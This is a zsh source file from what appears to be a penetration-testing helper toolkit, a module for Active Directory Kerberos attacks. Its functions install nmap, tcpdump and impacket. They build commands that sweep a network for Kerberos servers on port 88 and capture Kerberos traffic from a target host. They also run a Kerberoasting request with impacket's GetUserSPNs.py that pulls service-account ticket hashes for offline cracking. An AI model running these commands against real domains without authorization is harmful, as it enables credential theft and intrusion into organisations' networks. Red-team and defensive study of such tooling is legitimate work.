#!/usr/bin/env zsh

############################################################# 
# nb-ad-kerb
#############################################################
nb-ad-kerb-help() {
    cat << "DOC" | bat --plain --language=help

nb-ad-kerb
------------
The nb-ad-kerb namespace contains commands for scanning and enumerating kerberos records and servers.

Commands
--------
nb-ad-kerb-install        installs dependencies
nb-ad-kerb-nmap-sweep     scan a network for services
nb-ad-kerb-tcpdump        capture traffic to and from a host
nb-ad-kerb-kerberoast     get SPN for a service account

DOC
}

nb-ad-kerb-install() {
    __info "Running $0..."
    __pkgs tcpdump nmap impacket
}

nb-ad-kerb-nmap-sweep() {
    __check-project
    nb-vars-set-network
    print -z "sudo nmap -n -Pn -sS -p88 ${__NETWORK} -oA $(__netadpath)/kerb-sweep"
}

nb-ad-kerb-tcpdump() {
    __check-project
    nb-vars-set-iface
    nb-vars-set-rhost
    print -z "sudo tcpdump -i ${__IFACE} host ${__RHOST} and tcp port 88 -w $(__netadpath)/kerb.pcap"
}

nb-ad-kerb-kerberoast() {
    __ask "Enter target AD domain (must also be set in your hosts file)"
    nb-vars-set-domain
    __ask "Enter service user account"
    __check-user
    __ask "Enter the IP address of the target domain controller"
    nb-vars-set-rhost
    print -z "GetUserSPNs.py -request ${__DOMAIN}/${__USER} -dc-ip ${__RHOST} -outputfile $(__domadpath)/kerberoast.txt"
}
